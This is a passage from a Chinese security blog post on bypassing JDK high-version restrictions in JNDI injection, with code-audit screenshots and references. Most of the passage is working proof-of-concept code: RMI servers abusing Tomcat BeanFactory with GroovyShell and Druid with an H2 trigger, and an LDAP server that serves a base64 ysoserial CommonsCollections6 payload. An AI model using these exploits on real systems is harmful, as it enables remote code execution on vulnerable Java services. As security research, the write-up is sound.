+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.HighVer.LocalClass.BeanFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyAllRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyShell&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=evaluate&quot;</span>));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;&#x27;calc&#x27;.execute()&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.rebind(<span class="string">&quot;groovy&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1:1099/groovy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="其他类">其他类</h4>
+<p>其他RCE利用Poc可以查阅浅蓝师傅的总结，见引用参考</p>
+<h3 id="DruidDataSourceFactory类">*DruidDataSourceFactory类</h3>
+<p><strong>（这里只做简单记录，是复现另一个师傅的方法）</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="代码审计-7">代码审计</h4>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/18.png" class="">
+<p>getObjectInstance最下面创建了数据源</p>
+应该就是获取数据的过程
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/20.png" class="">
+<p>里面有个init来判断是否进行初始化</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/21.png" class="">
+<p>init()发起了数据库连接</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/22.png" class="">
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/23.png" class="">
+<h4 id="PoC">PoC</h4>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.HighVer.LocalClass.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DruidJDBCRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,JDBC_USER));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,JDBC_PASSWORD));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;init&quot;</span>,<span class="string">&quot;true&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;druid&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/druid is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="LDAP-反序列化RCE">LDAP + 反序列化RCE</h2>
+<h3 id="原理-5">原理</h3>
+<p>低版本LDAP通过返回恶意类完成RCE，而高版本ban了远程类加载。</p>
+<p><strong>LDAP有一个特殊的字段javaSerializedData，只要设置了它便会给Client端返回序列化串然后被反序列化</strong>，只要稍加修改即可绕过版本限制</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line"></span><br><span class="line">        <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">        entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, <span class="string">&quot;rO0yy&quot;</span>);</span><br><span class="line">            result.sendSearchEntry(entry);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>javaSerializedData会发送到受害者机器上完成反序列化</strong></p>
+<h3 id="PoC-2">PoC</h3>
+<p>最常用的反序列化RCE就是cc链了，先用ysoserial生成，由于特殊字符要b64一下，直接参考seebug用cc6</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc&quot;</span>|<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
+<p>解码放入entry即可</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.HighVer.SerializeLdap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeLdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=example,dc=com&quot;</span>);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">                <span class="number">389</span>,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">        ));</span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">directoryServer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        directoryServer.startListening();</span><br><span class="line">        System.out.println(<span class="string">&quot;ldap://127.0.0.1:389 is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line"></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line">                result.sendSearchEntry(entry);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/24.png" class="">
+<h3 id="代码审计-8">代码审计</h3>
+<p>追了好几个lookup，到了PartialCompositeContext.class，在这个for循环完成反序列化RCE的</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/25.png" class="">
+<p>接着来到ComponentContext.class，又是一个lookup</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/26.png" class="">
+<p>LdapCtx.class，这里var4是LDAP服务的entry，第二个属性非空也就是JavaClassName非空即可进入decodeObject</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/27.png" class="">
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/28.png" class="">
+<p>来到Obj.class，var1是javaSerializedData属性，如果非空就进行反序列化</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/29.png" class="">
+<p>配合cc6就完成了RCE</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/30.png" class="">
+<h3 id="调用栈-2">调用栈</h3>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/31.png" class="">
+<h2 id="参考-6">参考</h2>
+<blockquote>
+<p><a href="https://paper.seebug.org/942/#4-jdk-8u191">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a><a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a><br>
+<a href="https://xz.aliyun.com/t/10656#toc-8">JNDI jdk高版本绕过—— Druid</a></p>
+</blockquote>
+<h2 id="完-10">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JNDI注入</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>JNDI注入</tag>
+      </tags>
+  </entry>
+</search>
